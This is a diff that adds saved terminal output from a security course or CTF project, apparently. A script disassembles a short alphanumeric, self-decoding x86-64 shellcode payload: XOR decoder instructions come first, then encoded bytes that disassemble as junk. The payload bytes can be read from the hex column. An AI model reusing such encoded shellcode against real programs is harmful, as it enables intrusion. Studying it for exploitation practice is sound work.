@@ -1,0 +1,67 @@
+perry@perry-Virtual-Machine:~/Desktop/attack_and_defense_2022/security_2022$ python3 pwn/project_alicization/disasm_shellcode.py 
+   0:   50                      push   rax
+   1:   68 30 36 36 36          push   0x36363630
+   6:   54                      push   rsp
+   7:   59                      pop    rcx
+   8:   31 31                   xor    DWORD PTR [rcx], esi
+   a:   33 31                   xor    esi, DWORD PTR [rcx]
+   c:   58                      pop    rax
+   d:   68 33 33 33 33          push   0x33333333
+  12:   31 31                   xor    DWORD PTR [rcx], esi
+  14:   6b 31 33                imul   esi, DWORD PTR [rcx], 0x33
+  17:   58                      pop    rax
+  18:   6a 69                   push   0x69
+  1a:   56                      push   rsi
+  1b:   31 31                   xor    DWORD PTR [rcx], esi
+  1d:   48 63 31                movsxd rsi, DWORD PTR [rcx]
+  20:   5a                      pop    rdx
+  21:   58                      pop    rax
+  22:   59                      pop    rcx
+  23:   66 31 54 71 49          xor    WORD PTR [rcx+rsi*2+0x49], dx
+  28:   48                      rex.W
+  29:   66 39 6b 44             cmp    WORD PTR [rbx+0x44], bp
+  2d:   71 57                   jno    0x86
+  2f:   30 32                   xor    BYTE PTR [rdx], dh
+  31:   44 71 58                rex.R jno 0x8c
+  34:   30 44 31 48             xor    BYTE PTR [rcx+rsi*1+0x48], al
+  38:   75 33                   jne    0x6d
+  3a:   4d 32 47 30             rex.WRB xor r8b, BYTE PTR [r15+0x30]
+  3e:   5a                      pop    rdx
+  3f:   32 6f 34                xor    ch, BYTE PTR [rdi+0x34]
+  42:   48 30 75 30             rex.W xor BYTE PTR [rbp+0x30], sil
+  46:   50                      push   rax
+  47:   31 36                   xor    DWORD PTR [rsi], esi
+  49:   30 5a 30                xor    BYTE PTR [rdx+0x30], bl
+  4c:   67 37                   addr32 (bad) 
+  4e:   4f 30 5a 30             rex.WRXB xor BYTE PTR [r10+0x30], r11b
+  52:   43 31 30                rex.XB xor DWORD PTR [r8], esi
+  55:   30 79 35                xor    BYTE PTR [rcx+0x35], bh
+  58:   4f 33 47 30             rex.WRXB xor r8, QWORD PTR [r15+0x30]
+  5c:   32 30                   xor    dh, BYTE PTR [rax]
+  5e:   42 32 6e 30             rex.X xor bpl, BYTE PTR [rsi+0x30]
+  62:   36 30 4e 34             xor    BYTE PTR ss:[rsi+0x34], cl
+  66:   71 30                   jno    0x98
+  68:   6e                      outs   dx, BYTE PTR ds:[rsi]
+  69:   32 74 30 42             xor    dh, BYTE PTR [rax+rsi*1+0x42]
+  6d:   30 30                   xor    BYTE PTR [rax], dh
+  6f:   30 31                   xor    BYTE PTR [rcx], dh
+  71:   30 31                   xor    BYTE PTR [rcx], dh
+  73:   30 48 33                xor    BYTE PTR [rax+0x33], cl
+  76:   53                      push   rbx
+  77:   32 79 30                xor    bh, BYTE PTR [rcx+0x30]
+  7a:   59                      pop    rcx
+  7b:   30 4f 30                xor    BYTE PTR [rdi+0x30], cl
+  7e:   6e                      outs   dx, BYTE PTR ds:[rsi]
+  7f:   30 7a 30                xor    BYTE PTR [rdx+0x30], bh
+  82:   31 33                   xor    DWORD PTR [rbx], esi
+  84:   34 30                   xor    al, 0x30
+  86:   64 32 46 34             xor    al, BYTE PTR fs:[rsi+0x34]
+  8a:   79 38                   jns    0xc4
+  8c:   50                      push   rax
+  8d:   31 31                   xor    DWORD PTR [rcx], esi
+  8f:   35 6c 31 6e 30          xor    eax, 0x306e316c
+  94:   4a 30 68 30             rex.WX xor BYTE PTR [rax+0x30], bpl
+  98:   61                      (bad)  
+  99:   30 37                   xor    BYTE PTR [rdi], dh
+  9b:   30                      .byte 0x30
+  9c:   74                      .byte 0x74
